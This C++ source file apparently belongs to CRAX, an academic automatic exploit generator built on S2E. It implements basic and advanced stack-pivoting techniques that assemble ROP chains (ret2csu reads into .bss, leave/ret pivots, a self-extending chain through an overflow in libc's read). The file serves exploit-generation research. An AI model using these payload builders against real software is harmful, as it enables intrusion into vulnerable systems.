// Copyright 2021-2022 Software Quality Laboratory, NYCU.
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

#include <s2e/Plugins/CRAX/CRAX.h>
#include <s2e/Plugins/CRAX/Exploit.h>
#include <s2e/Plugins/CRAX/API/Disassembler.h>
#include <s2e/Plugins/CRAX/Modules/DynamicRop/DynamicRop.h>
#include <s2e/Plugins/CRAX/Techniques/Ret2csu.h>
#include <s2e/Plugins/CRAX/Utils/StringUtil.h>

#include <cassert>
#include <memory>

#include "StackPivoting.h"

using namespace klee;

namespace s2e::plugins::crax {

void StackPivoting::resolveRequiredGadgets() {
    Technique::resolveRequiredGadgets();

    // Register pivot destination as a script's variable.
    Exploit &exploit = g_crax->getExploit();
    exploit.registerSymbol("pivot_dest", exploit.getElf().bss() + 0x800);
}


BasicStackPivoting::BasicStackPivoting() : StackPivoting() {
    const Exploit &exploit = g_crax->getExploit();
    const ELF &elf = exploit.getElf();

    m_requiredGadgets.push_back(std::make_pair(&elf, "pop rbp ; ret"));
    m_requiredGadgets.push_back(std::make_pair(&elf, "leave ; ret"));
}



std::vector<RopPayload> BasicStackPivoting::getRopPayloadList() const {
    const Exploit &exploit = g_crax->getExploit();
    const ELF &elf = exploit.getElf();

    auto ret2csu = g_crax->getTechnique<Ret2csu>();
    assert(ret2csu);

    // Write the 2nd stage ROP payload via read() or gets() to `pivot_dest`.
    RopPayload part1;

    if (elf.hasSymbol("read")) {
        part1 = ret2csu->getRopPayloadList(
                BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
                ConstantExpr::create(0, Expr::Int64),
                BaseOffsetExpr::create<BaseType::VAR>(elf, "pivot_dest"),
                ConstantExpr::create(1024, Expr::Int64))[0];

    } else if (elf.hasSymbol("gets")) {
        part1 = ret2csu->getRopPayloadList(
                BaseOffsetExpr::create<BaseType::SYM>(elf, "gets"),
                BaseOffsetExpr::create<BaseType::VAR>(elf, "pivot_dest"),
                ConstantExpr::create(0, Expr::Int64),
                ConstantExpr::create(0, Expr::Int64))[0];
    }

    // Perform stack pivoting.
    RopPayload part2 = {
        BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName(elf, "pop rbp ; ret")),
        BaseOffsetExpr::create<BaseType::VAR>(elf, "pivot_dest"),
        BaseOffsetExpr::create<BaseType::VAR>(elf, Exploit::toVarName(elf, "leave ; ret"))
    };

    RopPayload ret;
    ret.reserve(1 + part1.size() + part2.size());
    ret.push_back(ConstantExpr::create(0, Expr::Int64));  // RBP
    ret.insert(ret.end(), part1.begin(), part1.end());
    ret.insert(ret.end(), part2.begin(), part2.end());
    return { ret };
}

RopPayload BasicStackPivoting::getExtraRopPayload() const {
    return { ConstantExpr::create(0, Expr::Int64) };  // RBP
}



AdvancedStackPivoting::AdvancedStackPivoting()
    : StackPivoting(),
      m_offsetToRetAddr(),
      m_readCallSites() {
    const Exploit &exploit = g_crax->getExploit();
    const ELF &elf = exploit.getElf();

    m_requiredGadgets.push_back(std::make_pair(&elf, "pop rsi ; pop r15 ; ret"));

    g_crax->beforeInstruction.connect(
            sigc::mem_fun(*this, &AdvancedStackPivoting::maybeInterceptReadCallSites));

    g_crax->beforeExploitGeneration.connect(
            sigc::mem_fun(*this, &AdvancedStackPivoting::beforeExploitGeneration));
}


void AdvancedStackPivoting::initialize() {
    Technique::initialize();

    initDynamicRopConstraintsOnce();
}

bool AdvancedStackPivoting::checkRequirements() const {
    const ELF &elf = g_crax->getExploit().getElf();

    return StackPivoting::checkRequirements() &&
           elf.hasSymbol("read") &&
           m_readCallSites.size();
}

std::vector<RopPayload> AdvancedStackPivoting::getRopPayloadList() const {
    assert(m_readCallSites.size() &&
           "AdvancedStackPivoting requires at least one call site of read@libc");

    const Exploit &exploit = g_crax->getExploit();
    const ELF &elf = exploit.getElf();

    auto ret2csu = g_crax->getTechnique<Ret2csu>();
    assert(ret2csu);

    // At this point, a stack-buffer overflow should take place inside libc,
    // and the weird machine shall not return from read@libc. Now we will
    // be able to perform ROP, but we don't have enough space to perform
    // a huge read() via ret2csu. So here we'll build a self-extending ROP payload
    // which continuously calls read@plt until there's enough space to perform
    // ret2csu once.
    RopPayload part1;
    for (size_t i = 0; i < 6; i++) {
        ref<Expr> e0 = BaseOffsetExpr::create<BaseType::VAR>(
                elf, Exploit::toVarName(elf, "pop rsi ; pop r15 ; ret"));

        ref<Expr> e1 = AddExpr::alloc(
                BaseOffsetExpr::create<BaseType::VAR>(elf, "pivot_dest"),
                AddExpr::alloc(
                        ConstantExpr::create(8, Expr::Int64),
                        MulExpr::alloc(
                                ConstantExpr::create(0x30, Expr::Int64),
                                ConstantExpr::create(i + 1, Expr::Int64))));

        ref<Expr> e2 = ConstantExpr::create(0, Expr::Int64);
        ref<Expr> e3 = BaseOffsetExpr::create<BaseType::SYM>(elf, "read");

        part1.push_back(e0);
        part1.push_back(e1);
        part1.push_back(e2);
        part1.push_back(e3);
    }

    // When PIE is enabled, _DYNAMIC doesn't contain the runtime address of _fini,
    // so we have to manually write one (in this case, we'll write one in .bss)
    if (g_crax->getExploit().getElf().checksec.hasPIE) {
        auto &exploit = g_crax->getExploit();
        uint64_t elfBase = exploit.getElf().getBase();
        uint64_t pivotDest = elfBase + exploit.getSymbolValue("pivot_dest");
        ret2csu->setGadget2CallTarget(pivotDest + 8 + 0x30 - elf.getBase());
        part1[6] = BaseOffsetExpr::create<BaseType::SYM>(elf, "_fini");
    }

    // Now, we should have accumulated enough space to perform a huge read() via ret2csu.
    // read(0, target_base + pivot_dest + 0x30 * 7, 0x400).
    RopPayload part2 = ret2csu->getRopPayloadList(
            BaseOffsetExpr::create<BaseType::SYM>(elf, "read"),
            ConstantExpr::create(0, Expr::Int64),
            AddExpr::alloc(
                    BaseOffsetExpr::create<BaseType::VAR>(elf, "pivot_dest"),
                    MulExpr::alloc(
                            ConstantExpr::create(0x30, Expr::Int64),
                            ConstantExpr::create(7, Expr::Int64))),
            ConstantExpr::create(0x400, Expr::Int64))[0];


    // Symbolic ROP payload
    // We're exploiting the overflow in libc's sys_read(),
    // so constraint solver isn't needed.
    std::vector<RopPayload> ret;
    ret.push_back({});

    // Direct ROP payload
    for (size_t i = 0; i < part1.size(); i += 6) {
        ret.push_back(RopPayload(part1.begin() + i, part1.begin() + i + 6));
    }
    for (size_t i = 0; i < part2.size(); i += 6) {
        size_t end = std::min(i + 6, part2.size());
        ret.push_back(RopPayload(part2.begin() + i, part2.begin() + end));
    }

    return ret;
}


void AdvancedStackPivoting::maybeInterceptReadCallSites(S2EExecutionState *state,
                                                        const Instruction &i) {
    if (g_crax->isCallSiteOf(i, "read")) {
        uint64_t buf = reg().readConcrete(Register::X64::RSI);
        uint64_t len = reg().readConcrete(Register::X64::RDX);
        m_readCallSites.insert({i.address, buf, len});
    }
}

void AdvancedStackPivoting::beforeExploitGeneration(S2EExecutionState *state) {
    assert(m_readCallSites.size() &&
           "AdvancedStackPivoting requires at least one call site of read().");

    uint64_t rsp = reg().readConcrete(Register::X64::RSP);
    m_offsetToRetAddr = rsp - (*m_readCallSites.rbegin()).buf - 16;
}

void AdvancedStackPivoting::initDynamicRopConstraintsOnce() const {
    const Exploit &exploit = g_crax->getExploit();
    S2EExecutionState *state = g_crax->getCurrentState();

    auto __dynRop = g_crax->getModule<DynamicRop>();
    assert(__dynRop && "AdvancedStackPivoting relies on DynamicRop module");
    auto &dynRop = *__dynRop;

    auto modState = g_crax->getModuleState(state, &dynRop);
    assert(modState);

    // These dynamic ROP constraints should only be added once.
    if (modState->initialized) {
        return;
    }

    modState->initialized = true;

    // Resolve ret2LeaRbp.
    int rbpOffset = 0;
    uint64_t ret2LeaRbp = determineRetAddr((*m_readCallSites.rbegin()).address, rbpOffset);
    uint64_t pivotDest = exploit.getElf().getBase() + exploit.getSymbolValue("pivot_dest");

    ref<Expr> rbp1 = ConstantExpr::create(pivotDest, Expr::Int64);
    ref<Expr> rip1 = ConstantExpr::create(ret2LeaRbp, Expr::Int64);

    using RegisterConstraint = DynamicRop::RegisterConstraint;

    dynRop.addConstraint(std::make_shared<RegisterConstraint>(Register::X64::RBP, rbp1))
        .addConstraint(std::make_shared<RegisterConstraint>(Register::X64::RIP, rip1))
        .commitConstraints();

    ref<Expr> rbp2 = ConstantExpr::create(pivotDest + 8 + rbpOffset, Expr::Int64);
    ref<Expr> rip2 = ConstantExpr::create(ret2LeaRbp, Expr::Int64);

    dynRop.addConstraint(std::make_shared<RegisterConstraint>(Register::X64::RBP, rbp2))
        .addConstraint(std::make_shared<RegisterConstraint>(Register::X64::RIP, rip2))
        .commitConstraints();

    // For debugging convenience, you may uncomment the following line :^)
    //g_crax->setShowInstructions(true);

    // At this point, the exploit generator is already running.
    // This is our last chance to stop it. This method will throw a
    // CpuExitException() and force S2E to re-execute at the PC we specified,
    // allowing us to perform Dynamic ROP.
    dynRop.applyNextConstraintGroup(*state);
}

uint64_t AdvancedStackPivoting::determineRetAddr(uint64_t readCallSiteAddr,
                                                 int &rbpOffset) const {
    std::string symbol = g_crax->getBelongingSymbol(readCallSiteAddr);
    uint64_t symbolAddr = g_crax->getExploit().getElf().getRuntimeAddress(symbol);
    assert(symbolAddr <= readCallSiteAddr);

    log<WARN>() << hexval(readCallSiteAddr) << " is within " << symbol << "(" << hexval(symbolAddr) << ")\n";

    // Disassemble the instructions between symbolAddr and readCallSiteAddr.
    std::vector<uint8_t> code = mem().readConcrete(symbolAddr, readCallSiteAddr - symbolAddr);
    std::vector<Instruction> insns = disas().disasm(code, symbolAddr);
    uint64_t ret = 0;

    // Look for any instruction like lea rax, [rbp - 0x20]
    // If we can find one, return the instruction's offset
    // (relative to ELF base), and copy 0x20 into the `rbpOffset` argument.
    for (int i = insns.size() - 1; i >= 0; i--) {
        static const std::string keyword = "[rbp - ";
        const std::string &target = insns[i].opStr;

        if (target.back() != ']') {
            continue;
        }

        size_t j = target.find(keyword);
        if (j == std::string::npos) {
            continue;
        }

        std::string strOffset = target.substr(j + keyword.size());
        strOffset.pop_back();  // remove the trailing ']'

        ret = insns[i].address;
        rbpOffset = std::stoi(strOffset, nullptr, 16);
        break;
    }

    assert(ret && "determineRetAddr(): no suitable candidates?");
    return ret;
}

}  // namespace s2e::plugins::crax
